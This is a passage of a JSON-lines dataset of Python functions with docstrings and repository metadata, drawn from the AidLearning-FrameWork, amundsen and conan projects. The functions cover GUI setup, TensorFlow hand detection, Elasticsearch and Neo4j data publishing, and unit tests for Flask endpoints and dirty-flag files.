= gui.TreeItem(\"Sub Item2\")\nsubti3 = gui.TreeItem(\"Sub Item3\")\nsubti4 = gui.TreeItem(\"Sub Item4\")\nsubsubti1 = gui.TreeItem(\"Sub Sub Item1\")\nsubsubti2 = gui.TreeItem(\"Sub Sub Item2\")\nsubsubti3 = gui.TreeItem(\"Sub Sub Item3\")\nself.tree.append([ti1, ti2, ti3])\nti2.append([subti1, subti2, subti3, subti4])\nsubti4.append([subsubti1, subsubti2, subsubti3])\n\n# appending a widget to another, the first argument is a string key\nsubContainerRight.append([self.counter, self.lbl, self.bt, self.txt, self.spin, self.progress, self.check, self.btInputDiag, self.btFileDiag])\n# use a defined key as we replace this widget later\nfdownloader = gui.FileDownloader('download test', '../remi/res/logo.png', width=200, height=30, margin='10px')\nsubContainerRight.append(fdownloader, key='file_downloader')\nsubContainerRight.append([self.btUploadFile, self.dropDown, self.slider, self.colorPicker, self.date, self.tree])\nself.subContainerRight = subContainerRight\n\nsubContainerLeft.append([self.img, self.table, self.listView, self.link, self.video])\n\nhorizontalContainer.append([subContainerLeft, subContainerRight])\n\nmenu = gui.Menu(width='100%', height='30px')\nm1 = gui.MenuItem('File', width=100, height=30)\nm2 = gui.MenuItem('View', width=100, height=30)\nm2.onclick.do(self.menu_view_clicked)\nm11 = gui.MenuItem('Save', width=100, height=30)\nm12 = gui.MenuItem('Open', width=100, height=30)\nm12.onclick.do(self.menu_open_clicked)\nm111 = gui.MenuItem('Save', width=100, height=30)\nm111.onclick.do(self.menu_save_clicked)\nm112 = gui.MenuItem('Save as', width=100, height=30)\nm112.onclick.do(self.menu_saveas_clicked)\nm3 = gui.MenuItem('Dialog', width=100, height=30)\nm3.onclick.do(self.menu_dialog_clicked)\n\nmenu.append([m1, m2, m3])\nm1.append([m11, m12])\nm11.append([m111, m112])\n\nmenubar = gui.MenuBar(width='100%', height='30px')\nmenubar.append(menu)\n\nverticalContainer.append([menubar, horizontalContainer])\n\n#this flag will be used to stop the display_counter Timer\nself.stop_flag = False \n\n# kick of regular display of counter\nself.display_counter()\n\n# returning the root widget\nreturn verticalContainer", "path": "AidLearning-FrameWork/gui_cvs/widgets_overview_app.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "aidlearning/AidLearning-FrameWork", "stars": 5424, "license": "other", "language": "python", "size": 80473}
{"docstring": "# load frozen tensorflow model into memory\n", "func_signal": "def load_inference_graph():\n", "code": "    print(\"> ====== Loading frozen graph into memory\")\n    detection_graph = tf.Graph()\n    with detection_graph.as_default():\n        od_graph_def = tf.GraphDef()\n        with tf.gfile.GFile(PATH_TO_CKPT, 'rb') as fid:\n            serialized_graph = fid.read()\n            od_graph_def.ParseFromString(serialized_graph)\n            tf.import_graph_def(od_graph_def, name='')\n        \n        config = tf.ConfigProto(device_count={\"CPU\": 4},\n            inter_op_parallelism_threads = 1, \n            intra_op_parallelism_threads = 4,\n            log_device_placement=True)\n    sess = tf.Session(config=config,graph=detection_graph)\n    print(\">  ====== Inference graph loaded.\")\n    return detection_graph, sess", "path": "AidLearning-FrameWork/src/handtf/utils/detector_utils.py", "commit_date": "2019-08-08 00:00:00", "repo_name": "aidlearning/AidLearning-FrameWork", "stars": 5424, "license": "other", "language": "python", "size": 80473}
{"docstring": "\"\"\" Overloading App.on_close event to stop the Timer.\n\"\"\"\n", "func_signal": "def on_close(self):\n", "code": "self.stop_flag = True\nsuper(MyApp, self).on_close()", "path": "AidLearning-FrameWork/gui_cvs/widgets_overview_app.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "aidlearning/AidLearning-FrameWork", "stars": 5424, "license": "other", "language": "python", "size": 80473}
{"docstring": "\"\"\"Loads label map proto.\n\nArgs:\n  path: path to StringIntLabelMap proto text file.\nReturns:\n  a StringIntLabelMapProto\n\"\"\"\n", "func_signal": "def load_labelmap(path):\n", "code": "with tf.gfile.GFile(path, 'r') as fid:\n    label_map_string = fid.read()\n    label_map = string_int_label_map_pb2.StringIntLabelMap()\n    try:\n        text_format.Merge(label_map_string, label_map)\n    except text_format.ParseError:\n        label_map.ParseFromString(label_map_string)\n_validate_label_map(label_map)\nreturn label_map", "path": "AidLearning-FrameWork/src/handtf/utils/label_map_util.py", "commit_date": "2019-08-08 00:00:00", "repo_name": "aidlearning/AidLearning-FrameWork", "stars": 5424, "license": "other", "language": "python", "size": 80473}
{"docstring": "# Determined using a piece of paper of known length, code can be found in distance to camera\n", "func_signal": "def draw_box_on_image(num_hands_detect, score_thresh, scores, boxes, classes, im_width, im_height, image_np):\n", "code": "focalLength = 875\n# The average width of a human hand (inches) http://www.theaveragebody.com/average_hand_size.php\n# added an inch since thumb is not included\navg_width = 4.0\n# To more easily differetiate distances and detected bboxes\ncolor = None\ncolor0 = (255,0,0)\ncolor1 = (0,50,255)\nfor i in range(num_hands_detect):\n    if (scores[i] > score_thresh):\n        if classes[i] == 1: id = 'open'\n        if classes[i] == 2:\n            id ='closed'\n            avg_width = 3.0 # To compensate bbox size change\n\n        if i == 0: color = color0\n        else: color = color1\n\n        (left, right, top, bottom) = (boxes[i][1] * im_width, boxes[i][3] * im_width,\n                                      boxes[i][0] * im_height, boxes[i][2] * im_height)\n        p1 = (int(left), int(top))\n        p2 = (int(right), int(bottom))\n\n        dist = distance_to_camera(avg_width, focalLength, int(right-left))\n\n        cv2.rectangle(image_np, p1, p2, color , 3, 1)\n\n        cv2.putText(image_np, 'hand '+str(i)+': '+id, (int(left), int(top)-5),\n                    cv2.FONT_HERSHEY_SIMPLEX, 0.5 , color, 2)\n\n        cv2.putText(image_np, 'confidence: '+str(\"{0:.2f}\".format(scores[i])),\n                    (int(left),int(top)-20),\n                    cv2.FONT_HERSHEY_SIMPLEX, 0.5, (0,255,0), 2)\n\n        cv2.putText(image_np, 'distance: '+str(\"{0:.2f}\".format(dist)+' inches'),\n                    (int(im_width*0.7),int(im_height*0.9+30*i)),\n                    cv2.FONT_HERSHEY_SIMPLEX, 0.75, color, 2)", "path": "AidLearning-FrameWork/src/handtf/utils/detector_utils.py", "commit_date": "2019-08-08 00:00:00", "repo_name": "aidlearning/AidLearning-FrameWork", "stars": 5424, "license": "other", "language": "python", "size": 80473}
{"docstring": "#idle function called every update cycle\n", "func_signal": "def idle(self):\n", "code": "self.lbl.set_text(cvs.getLbs())\npass", "path": "AidLearning-FrameWork/src/facencnn/facepose.py", "commit_date": "2019-08-08 00:00:00", "repo_name": "aidlearning/AidLearning-FrameWork", "stars": 5424, "license": "other", "language": "python", "size": 80473}
{"docstring": "# convert the image to grayscale, blur it, and detect edges\n", "func_signal": "def find_marker(image):\n", "code": "gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)\ngray = cv2.GaussianBlur(gray, (5, 5), 0)\nedged = cv2.Canny(gray, 35, 125)\n\n# find the contours in the edged image and keep the largest one;\n# we'll assume that this is our piece of paper in the image\ncnts = cv2.findContours(edged.copy(), cv2.RETR_LIST, cv2.CHAIN_APPROX_SIMPLE)\ncnts = cnts[0] if imutils.is_cv2() else cnts[1]\nc = max(cnts, key = cv2.contourArea)\n\n# compute the bounding box of the of the paper region and return it\nreturn cv2.minAreaRect(c)", "path": "AidLearning-FrameWork/src/handtf/distance_to_camera.py", "commit_date": "2019-08-08 00:00:00", "repo_name": "aidlearning/AidLearning-FrameWork", "stars": 5424, "license": "other", "language": "python", "size": 80473}
{"docstring": "\"\"\"Checks if a label map is valid.\n\nArgs:\n  label_map: StringIntLabelMap to validate.\n\nRaises:\n  ValueError: if label map is invalid.\n\"\"\"\n", "func_signal": "def _validate_label_map(label_map):\n", "code": "for item in label_map.item:\n    if item.id < 1:\n        raise ValueError('Label map ids should be >= 1.')", "path": "AidLearning-FrameWork/src/handtf/utils/label_map_util.py", "commit_date": "2019-08-08 00:00:00", "repo_name": "aidlearning/AidLearning-FrameWork", "stars": 5424, "license": "other", "language": "python", "size": 80473}
{"docstring": "#img = cv2.imread(path)\n#img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)\n", "func_signal": "def resizeimg(img, width, height):\n", "code": "img = cv2.resize(img, (width,height))\n\nimg = img.astype(float)\nimg = img * (2.0 / 255.0) - 1.0\nreturn img", "path": "AidLearning-FrameWork/buildin/fastpose/webpose.py", "commit_date": "2019-08-04 00:00:00", "repo_name": "aidlearning/AidLearning-FrameWork", "stars": 5424, "license": "other", "language": "python", "size": 80473}
{"docstring": "# initcv(process)\n#creating a container VBox type, vertical (you can use also HBox or Widget)\n", "func_signal": "def main(self):\n", "code": "main_container = gui.VBox(width=360, height=680, style={'margin':'0px auto'})\n\nself.aidcam = OpencvVideoWidget(self, width=340, height=480)\nself.aidcam.style['margin'] = '10px'\n\nself.aidcam.set_identifier(\"myimage_receiver\")\nmain_container.append(self.aidcam)\n\n# Display FPS on frame\nself.lbl = gui.Label('This is a LABEL!', width=360, height=30, margin='10px')\nmain_container.append(self.lbl)\n\nreturn main_container", "path": "AidLearning-FrameWork/src/handtf/webcam.py", "commit_date": "2019-08-08 00:00:00", "repo_name": "aidlearning/AidLearning-FrameWork", "stars": 5424, "license": "other", "language": "python", "size": 80473}
{"docstring": "# a list() of filenames and folders is returned\n", "func_signal": "def on_fileselection_dialog_confirm(self, widget, filelist):\n", "code": "self.lbl.set_text('Selected files: %s' % ','.join(filelist))\nif len(filelist):\n    f = filelist[0]\n    # replace the last download link\n    fdownloader = gui.FileDownloader(\"download selected\", f, width=200, height=30)\n    self.subContainerRight.append(fdownloader, key='file_downloader')", "path": "AidLearning-FrameWork/gui_cvs/widgets_overview_app.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "aidlearning/AidLearning-FrameWork", "stars": 5424, "license": "other", "language": "python", "size": 80473}
{"docstring": "#DON'T MAKE CHANGES HERE, THIS METHOD GETS OVERWRITTEN WHEN SAVING IN THE EDITOR\n", "func_signal": "def __init__(self, *args, **kwargs):\n", "code": "if not 'editing_mode' in kwargs.keys():\n    super(untitled, self).__init__(*args, static_file_path={'my_res':'./res/'})", "path": "AidLearning-FrameWork/src/cvs/webcam.py", "commit_date": "2019-08-08 00:00:00", "repo_name": "aidlearning/AidLearning-FrameWork", "stars": 5424, "license": "other", "language": "python", "size": 80473}
{"docstring": "\"\"\"\nTest catching errors in the data shape returned by post_sql_json(), which should result in\na response with 500 error and empty preview_data payload\n:return:\n\"\"\"\n", "func_signal": "def test_post_sql_json_incorrect_data_shape(self) -> None:\n", "code": "with app.test_request_context():\n    response = MockBadDataClient().get_preview_data(params={})\n    self.assertEqual(json.loads(response.data).get('preview_data'), {})\n    self.assertEqual(response.status_code, HTTPStatus.INTERNAL_SERVER_ERROR)", "path": "amundsen/frontend/tests/unit/base/test_superset_preview_client.py", "commit_date": "2020-07-17 00:00:00", "repo_name": "amundsen-io/amundsen", "stars": 4222, "license": "apache-2.0", "language": "python", "size": 30444}
{"docstring": "\"\"\"\nRetrieve all indices that currently have {elasticsearch_alias} alias\n:return: list of elasticsearch indices\n\"\"\"\n", "func_signal": "def _fetch_old_index(self) -> List[str]:\n", "code": "try:\n    indices = self.elasticsearch_client.indices.get_alias(self.elasticsearch_alias).keys()\n    return indices\nexcept NotFoundError:\n    LOGGER.warn(\"Received index not found error from Elasticsearch. \" +\n                \"The index doesn't exist for a newly created ES. It's OK on first run.\")\n    # return empty list on exception\n    return []", "path": "amundsen/databuilder/databuilder/publisher/elasticsearch_publisher.py", "commit_date": "2020-12-15 00:00:00", "repo_name": "amundsen-io/amundsen", "stars": 4222, "license": "apache-2.0", "language": "python", "size": 30444}
{"docstring": "\"\"\"\nBuilds a TableauGraphQLDashboardTableExtractor. All data required can be retrieved with a single GraphQL call.\n:return: A TableauGraphQLDashboardTableExtractor that creates dashboard <> table relationships.\n\"\"\"\n", "func_signal": "def _build_extractor(self) -> TableauGraphQLDashboardTableExtractor:\n", "code": "extractor = TableauGraphQLDashboardTableExtractor()\ntableau_extractor_conf = \\\n    Scoped.get_scoped_conf(self._conf, extractor.get_scope())\\\n          .with_fallback(self._conf)\\\n          .with_fallback(ConfigFactory.from_dict({TableauGraphQLApiExtractor.QUERY: self.query,\n                                                  STATIC_RECORD_DICT: {'product': 'tableau'}\n                                                  }\n                                                 )\n                         )\nextractor.init(conf=tableau_extractor_conf)\nreturn extractor", "path": "amundsen/databuilder/databuilder/extractor/dashboard/tableau/tableau_dashboard_table_extractor.py", "commit_date": "2020-12-15 00:00:00", "repo_name": "amundsen-io/amundsen", "stars": 4222, "license": "apache-2.0", "language": "python", "size": 30444}
{"docstring": "\"\"\"\nAPI to get all existing badges\n\"\"\"\n", "func_signal": "def get(self) -> Iterable[Union[Mapping, int, None]]:\n", "code": "badges = self.client.get_badges()\nreturn marshal({'badges': badges}, badges_fields), HTTPStatus.OK", "path": "amundsen/metadata/metadata_service/api/badge.py", "commit_date": "2020-09-23 00:00:00", "repo_name": "amundsen-io/amundsen", "stars": 4222, "license": "apache-2.0", "language": "python", "size": 30444}
{"docstring": "\"\"\"\nTest failure due to incorrect implementation of base_mail_client\n:return:\n\"\"\"\n", "func_signal": "def test_feedback_client_raise_exception(self) -> None:\n", "code": "local_app.config['MAIL_CLIENT'] = MockBadClient()\nwith local_app.test_client() as test:\n    response = test.post('/api/mail/v0/feedback', json={\n        'rating': '10', 'comment': 'test'\n    })\n    self.assertEqual(response.status_code, HTTPStatus.INTERNAL_SERVER_ERROR)", "path": "amundsen/frontend/tests/unit/api/mail/test_v0.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "amundsen-io/amundsen", "stars": 4222, "license": "apache-2.0", "language": "python", "size": 30444}
{"docstring": "\"\"\"\nTest that Not Implemented error is raised when PREVIEW_CLIENT is None\n:return:\n\"\"\"\n# Reset side effects of other tests to ensure that the results are the\n# same regardless of execution order\n", "func_signal": "def test_no_client_class(self) -> None:\n", "code": "v0.PREVIEW_CLIENT_CLASS = None\nv0.PREVIEW_CLIENT_INSTANCE = None\n\nlocal_app.config['PREVIEW_CLIENT'] = None\nwith local_app.test_client() as test:\n    response = test.post('/api/preview/v0/')\n    self.assertEqual(response.status_code, HTTPStatus.NOT_IMPLEMENTED)", "path": "amundsen/frontend/tests/unit/api/preview/test_v0.py", "commit_date": "2020-12-08 00:00:00", "repo_name": "amundsen-io/amundsen", "stars": 4222, "license": "apache-2.0", "language": "python", "size": 30444}
{"docstring": "\"\"\"\nLaunches data builder job that extracts table and column metadata from MySQL Hive metastore database,\nand publishes to Neo4j.\n@param kwargs:\n@return:\n\"\"\"\n\n# Adding to where clause to scope schema, filter out temp tables which start with numbers and views\n", "func_signal": "def create_table_metadata_databuilder_job():\n", "code": "where_clause_suffix = textwrap.dedent(\"\"\"\n    WHERE d.NAME IN {schemas}\n    AND t.TBL_NAME NOT REGEXP '^[0-9]+'\n    AND t.TBL_TYPE IN ( 'EXTERNAL_TABLE', 'MANAGED_TABLE' )\n\"\"\").format(schemas=SUPPORTED_HIVE_SCHEMA_SQL_IN_CLAUSE)\n\ntmp_folder = '/var/tmp/amundsen/table_metadata'\nnode_files_folder = f'{tmp_folder}/nodes/'\nrelationship_files_folder = f'{tmp_folder}/relationships/'\n\njob_config = ConfigFactory.from_dict({\n    f'extractor.hive_table_metadata.{HiveTableMetadataExtractor.WHERE_CLAUSE_SUFFIX_KEY}': where_clause_suffix,\n    f'extractor.hive_table_metadata.extractor.sqlalchemy.{SQLAlchemyExtractor.CONN_STRING}': connection_string(),\n    f'loader.filesystem_csv_neo4j.{FsNeo4jCSVLoader.NODE_DIR_PATH}': node_files_folder,\n    f'loader.filesystem_csv_neo4j.{FsNeo4jCSVLoader.RELATION_DIR_PATH}': relationship_files_folder,\n    f'publisher.neo4j.{neo4j_csv_publisher.NODE_FILES_DIR}': node_files_folder,\n    f'publisher.neo4j.{neo4j_csv_publisher.RELATION_FILES_DIR}': relationship_files_folder,\n    f'publisher.neo4j.{neo4j_csv_publisher.NEO4J_END_POINT_KEY}': neo4j_endpoint,\n    f'publisher.neo4j.{neo4j_csv_publisher.NEO4J_USER}': neo4j_user,\n    f'publisher.neo4j.{neo4j_csv_publisher.NEO4J_PASSWORD}': neo4j_password,\n    f'publisher.neo4j.{neo4j_csv_publisher.NEO4J_CREATE_ONLY_NODES}': [DESCRIPTION_NODE_LABEL],\n    'publisher.neo4j.job_publish_tag': 'some_unique_tag'  # TO-DO unique tag must be added\n})\n\njob = DefaultJob(conf=job_config,\n                 task=DefaultTask(extractor=HiveTableMetadataExtractor(), loader=FsNeo4jCSVLoader()),\n                 publisher=Neo4jCsvPublisher())\njob.launch()", "path": "amundsen/databuilder/example/dags/hive_sample_dag.py", "commit_date": "2020-12-15 00:00:00", "repo_name": "amundsen-io/amundsen", "stars": 4222, "license": "apache-2.0", "language": "python", "size": 30444}
{"docstring": "\"\"\"\nUse Elasticsearch Bulk API to load data from file to a {new_index}.\nAfter upload, swap alias from {old_index} to {new_index} in a atomic operation\nto route traffic to {new_index}\n\"\"\"\n", "func_signal": "def publish_impl(self) -> None:\n", "code": "actions = [json.loads(l) for l in self.file_handler.readlines()]\n# ensure new data exists\nif not actions:\n    LOGGER.warning(\"received no data to upload to Elasticsearch!\")\n    return\n\n# Convert object to json for elasticsearch bulk upload\n# Bulk load JSON format is defined here:\n# https://www.elastic.co/guide/en/elasticsearch/reference/6.2/docs-bulk.html\nbulk_actions = []\ncnt = 0\n\n# create new index with mapping\nself.elasticsearch_client.indices.create(index=self.elasticsearch_new_index, body=self.elasticsearch_mapping)\nfor action in actions:\n    index_row = dict(index=dict(_index=self.elasticsearch_new_index,\n                                _type=self.elasticsearch_type))\n    bulk_actions.append(index_row)\n    bulk_actions.append(action)\n    cnt += 1\n    if cnt == self.elasticsearch_batch_size:\n        self.elasticsearch_client.bulk(bulk_actions)\n        LOGGER.info('Publish %i of records to ES', cnt)\n        cnt = 0\n        bulk_actions = []\n\n# Do the final bulk actions\nif bulk_actions:\n    self.elasticsearch_client.bulk(bulk_actions)\n\n# fetch indices that have {elasticsearch_alias} as alias\nelasticsearch_old_indices = self._fetch_old_index()\n\n# update alias to point to the new index\nactions = [{\"add\": {\"index\": self.elasticsearch_new_index, \"alias\": self.elasticsearch_alias}}]\n\n# delete old indices\ndelete_actions = [{\"remove_index\": {\"index\": index}} for index in elasticsearch_old_indices]\nactions.extend(delete_actions)\n\nupdate_action = {\"actions\": actions}\n\n# perform alias update and index delete in single atomic operation\nself.elasticsearch_client.indices.update_aliases(update_action)", "path": "amundsen/databuilder/databuilder/publisher/elasticsearch_publisher.py", "commit_date": "2020-12-15 00:00:00", "repo_name": "amundsen-io/amundsen", "stars": 4222, "license": "apache-2.0", "language": "python", "size": 30444}
{"docstring": "\"\"\"\nTest that the endpoint returns 500 exception when error occurs\nand that send_notification is not called\n:return:\n\"\"\"\n", "func_signal": "def test_notification_endpoint_fails_with_exception(self, send_notification_mock) -> None:\n", "code": "with local_app.test_client() as test:\n    # generates error\n    response = test.post('/api/mail/v0/notification', json=None)\n\n    self.assertEqual(response.status_code, HTTPStatus.INTERNAL_SERVER_ERROR)\n    self.assertFalse(send_notification_mock.called)", "path": "amundsen/frontend/tests/unit/api/mail/test_v0.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "amundsen-io/amundsen", "stars": 4222, "license": "apache-2.0", "language": "python", "size": 30444}
{"docstring": "\"\"\"\nValidation method. Focused on limit the risk on deleting nodes and relations.\n - Check if deleted nodes will be within 10% of total nodes.\n:return:\n\"\"\"\n", "func_signal": "def validate(self) -> None:\n", "code": "self._validate_node_staleness_pct()\nself._validate_relation_staleness_pct()", "path": "amundsen/databuilder/databuilder/task/neo4j_staleness_removal_task.py", "commit_date": "2020-12-15 00:00:00", "repo_name": "amundsen-io/amundsen", "stars": 4222, "license": "apache-2.0", "language": "python", "size": 30444}
{"docstring": "\"\"\"\nRetrieve declared action log callbacks from entry point where there are two groups that can be registered:\n 1. \"action_log.post_exec.plugin\": callback for pre-execution\n 2. \"action_log.pre_exec.plugin\": callback for post-execution\n:return: None\n\"\"\"\n", "func_signal": "def register_action_logs() -> None:\n", "code": "for entry_point in iter_entry_points(group='action_log.post_exec.plugin', name=None):\n    print('Registering post_exec action_log entry_point: {}'.format(entry_point), file=sys.stderr)\n    register_post_exec_callback(entry_point.load())\n\nfor entry_point in iter_entry_points(group='action_log.pre_exec.plugin', name=None):\n    print('Registering pre_exec action_log entry_point: {}'.format(entry_point), file=sys.stderr)\n    register_pre_exec_callback(entry_point.load())", "path": "amundsen/frontend/amundsen_application/log/action_log_callback.py", "commit_date": "2020-07-17 00:00:00", "repo_name": "amundsen-io/amundsen", "stars": 4222, "license": "apache-2.0", "language": "python", "size": 30444}
{"docstring": "\"\"\"\nAPI to fetch all the existing tags with usage.\n\"\"\"\n", "func_signal": "def get(self) -> Iterable[Union[Mapping, int, None]]:\n", "code": "tag_usages = self.client.get_tags()\nreturn marshal({'tag_usages': tag_usages}, tag_usage_fields), HTTPStatus.OK", "path": "amundsen/metadata/metadata_service/api/tag.py", "commit_date": "2020-09-17 00:00:00", "repo_name": "amundsen-io/amundsen", "stars": 4222, "license": "apache-2.0", "language": "python", "size": 30444}
{"docstring": "\"\"\"\nBuilds a TableauGraphQLApiMetadataExtractor. All data required can be retrieved with a single GraphQL call.\n:return: A TableauGraphQLApiMetadataExtractor that provides core dashboard metadata.\n\"\"\"\n", "func_signal": "def _build_extractor(self) -> TableauGraphQLApiMetadataExtractor:\n", "code": "extractor = TableauGraphQLApiMetadataExtractor()\ntableau_extractor_conf = Scoped.get_scoped_conf(self._conf, extractor.get_scope()) \\\n    .with_fallback(self._conf) \\\n    .with_fallback(ConfigFactory.from_dict({TableauGraphQLApiExtractor.QUERY: self.query,\n                                            STATIC_RECORD_DICT: {'product': 'tableau'}}))\nextractor.init(conf=tableau_extractor_conf)\nreturn extractor", "path": "amundsen/databuilder/databuilder/extractor/dashboard/tableau/tableau_dashboard_extractor.py", "commit_date": "2020-12-15 00:00:00", "repo_name": "amundsen-io/amundsen", "stars": 4222, "license": "apache-2.0", "language": "python", "size": 30444}
{"docstring": "\"\"\"\nTest catching any exception raised in get_preview_data(), which should result in\na response with 500 error and empty preview_data payload\n:return:\n\"\"\"\n", "func_signal": "def test_get_preview_data_raise_exception(self) -> None:\n", "code": "with app.test_request_context():\n    response = MockExceptionClient().get_preview_data(params={})\n    self.assertEqual(json.loads(response.data).get('preview_data'), {})\n    self.assertEqual(response.status_code, HTTPStatus.INTERNAL_SERVER_ERROR)", "path": "amundsen/frontend/tests/unit/base/test_superset_preview_client.py", "commit_date": "2020-07-17 00:00:00", "repo_name": "amundsen-io/amundsen", "stars": 4222, "license": "apache-2.0", "language": "python", "size": 30444}
{"docstring": "\"\"\"\nTest mail client success\n:return:\n\"\"\"\n", "func_signal": "def test_feedback_client_success(self) -> None:\n", "code": "local_app.config['MAIL_CLIENT'] = MockMailClient(status_code=200)\nwith local_app.test_client() as test:\n    response = test.post('/api/mail/v0/feedback', json={\n        'rating': '10', 'comment': 'test'\n    })\n    self.assertEqual(response.status_code, HTTPStatus.OK)", "path": "amundsen/frontend/tests/unit/api/mail/test_v0.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "amundsen-io/amundsen", "stars": 4222, "license": "apache-2.0", "language": "python", "size": 30444}
{"docstring": "\"\"\"\nVerify that the returned response contains the given messag and status_code\n:return:\n\"\"\"\n", "func_signal": "def test_create_error_response(self) -> None:\n", "code": "test_message = 'Success'\ntest_payload = {}\nstatus_code = 200\nwith local_app.app_context():\n    response = create_error_response(message=test_message,\n                                     payload=test_payload,\n                                     status_code=status_code)\ndata = json.loads(response.data)\nself.assertEqual(response.status_code, status_code)\nself.assertEqual(data.get('msg'), test_message)", "path": "amundsen/frontend/tests/unit/utils/test_response_utils.py", "commit_date": "2020-07-17 00:00:00", "repo_name": "amundsen-io/amundsen", "stars": 4222, "license": "apache-2.0", "language": "python", "size": 30444}
{"docstring": "\"\"\"\nTest post_sql_json(), which should result in\na response with 500 error and empty preview_data payload\n:return:\n\"\"\"\n", "func_signal": "def test_post_sql_json_correct_data_shape(self) -> None:\n", "code": "with app.test_request_context():\n    response = MockClient().get_preview_data(params={}, optionalHeaders={'testKey': 'testValue'})\n    self.assertEqual(json.loads(response.data).get('preview_data'), expected_results)\n    self.assertEqual(response.status_code, HTTPStatus.OK)", "path": "amundsen/frontend/tests/unit/base/test_superset_preview_client.py", "commit_date": "2020-07-17 00:00:00", "repo_name": "amundsen-io/amundsen", "stars": 4222, "license": "apache-2.0", "language": "python", "size": 30444}
{"docstring": "\"\"\"\nTest that specific status codes returned from a custom mail client propagate,\nso that they may be appropriately logged and surfaced to the React application\n:return:\n\"\"\"\n", "func_signal": "def test_feedback_client_propagate_status_code(self) -> None:\n", "code": "expected_code = HTTPStatus.BAD_REQUEST\nlocal_app.config['MAIL_CLIENT'] = MockMailClient(status_code=expected_code)\nwith local_app.test_client() as test:\n    response = test.post('/api/mail/v0/feedback', json={\n        'rating': '10', 'comment': 'test'\n    })\n    self.assertEqual(response.status_code, expected_code)", "path": "amundsen/frontend/tests/unit/api/mail/test_v0.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "amundsen-io/amundsen", "stars": 4222, "license": "apache-2.0", "language": "python", "size": 30444}
{"docstring": "# loader saves data to this location and publisher reads it from here\n", "func_signal": "def create_es_publisher_sample_job():\n", "code": "extracted_search_data_path = '/var/tmp/amundsen/search_data.json'\n\ntask = DefaultTask(loader=FSElasticsearchJSONLoader(),\n                   extractor=Neo4jSearchDataExtractor(),\n                   transformer=NoopTransformer())\n\n# elastic search client instance\nelasticsearch_client = es\n# unique name of new index in Elasticsearch\nelasticsearch_new_index_key = f'tables{uuid.uuid4()}'\n# related to mapping type from /databuilder/publisher/elasticsearch_publisher.py#L38\nelasticsearch_new_index_key_type = 'table'\n# alias for Elasticsearch used in amundsensearchlibrary/search_service/config.py as an index\nelasticsearch_index_alias = 'table_search_index'\n\njob_config = ConfigFactory.from_dict({\n    f'extractor.search_data.extractor.neo4j.{Neo4jExtractor.GRAPH_URL_CONFIG_KEY}': neo4j_endpoint,\n    f'extractor.search_data.extractor.neo4j.{Neo4jExtractor.MODEL_CLASS_CONFIG_KEY}':\n        'databuilder.models.table_elasticsearch_document.TableESDocument',\n    f'extractor.search_data.extractor.neo4j.{Neo4jExtractor.NEO4J_AUTH_USER}': neo4j_user,\n    f'extractor.search_data.extractor.neo4j.{Neo4jExtractor.NEO4J_AUTH_PW}': neo4j_password,\n    f'loader.filesystem.elasticsearch.{FSElasticsearchJSONLoader.FILE_PATH_CONFIG_KEY}': extracted_search_data_path,\n    f'loader.filesystem.elasticsearch.{FSElasticsearchJSONLoader.FILE_MODE_CONFIG_KEY}': 'w',\n    f'publisher.elasticsearch.{ElasticsearchPublisher.FILE_PATH_CONFIG_KEY}': extracted_search_data_path,\n    f'publisher.elasticsearch.{ElasticsearchPublisher.FILE_MODE_CONFIG_KEY}': 'r',\n    f'publisher.elasticsearch.{ElasticsearchPublisher.ELASTICSEARCH_CLIENT_CONFIG_KEY}':\n        elasticsearch_client,\n    f'publisher.elasticsearch.{ElasticsearchPublisher.ELASTICSEARCH_NEW_INDEX_CONFIG_KEY}':\n        elasticsearch_new_index_key,\n    f'publisher.elasticsearch.{ElasticsearchPublisher.ELASTICSEARCH_DOC_TYPE_CONFIG_KEY}':\n        elasticsearch_new_index_key_type,\n    f'publisher.elasticsearch.{ElasticsearchPublisher.ELASTICSEARCH_ALIAS_CONFIG_KEY}':\n        elasticsearch_index_alias\n})\n\njob = DefaultJob(conf=job_config,\n                 task=task,\n                 publisher=ElasticsearchPublisher())\njob.launch()", "path": "amundsen/databuilder/example/dags/postgres_sample_dag.py", "commit_date": "2020-12-15 00:00:00", "repo_name": "amundsen-io/amundsen", "stars": 4222, "license": "apache-2.0", "language": "python", "size": 30444}
{"docstring": "\"\"\"\nTest that the endpoint fails if notificationType is not provided in the\nrequest json\n:return:\n\"\"\"\n", "func_signal": "def test_notification_endpoint_fails_missing_notification_type(self, send_notification_mock) -> None:\n", "code": "test_recipients = ['test@test.com']\ntest_sender = 'test2@test.com'\ntest_options = {}\n\nwith local_app.test_client() as test:\n    response = test.post('/api/mail/v0/notification', json={\n        'recipients': test_recipients,\n        'sender': test_sender,\n        'options': test_options,\n    })\n    self.assertEqual(response.status_code, HTTPStatus.BAD_REQUEST)\n    self.assertFalse(send_notification_mock.called)", "path": "amundsen/frontend/tests/unit/api/mail/test_v0.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "amundsen-io/amundsen", "stars": 4222, "license": "apache-2.0", "language": "python", "size": 30444}
{"docstring": "\"\"\" Dirty flag must be created by set_dirty\n\n\"\"\"\n", "func_signal": "def test_set_dirty(self):\n", "code": "set_dirty(self.temp_folder)\nself.assertTrue(os.path.exists(self.dirty_folder))", "path": "conan/conans/test/unittests/util/files/test_dirty.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "conan-io/conan", "stars": 7606, "license": "mit", "language": "python", "size": 28820}
{"docstring": "\"\"\" Broken context must preserve dirty state\n\n    Raise an exception in middle of context. By default,\n    dirty file is not removed.\n\"\"\"\n", "func_signal": "def test_interrupted_dirty_context(self):\n", "code": "try:\n    with set_dirty_context_manager(self.temp_folder):\n        self.assertTrue(os.path.exists(self.dirty_folder))\n        raise RuntimeError()\nexcept RuntimeError:\n    pass\nself.assertTrue(os.path.exists(self.dirty_folder))", "path": "conan/conans/test/unittests/util/files/test_dirty.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "conan-io/conan", "stars": 7606, "license": "mit", "language": "python", "size": 28820}
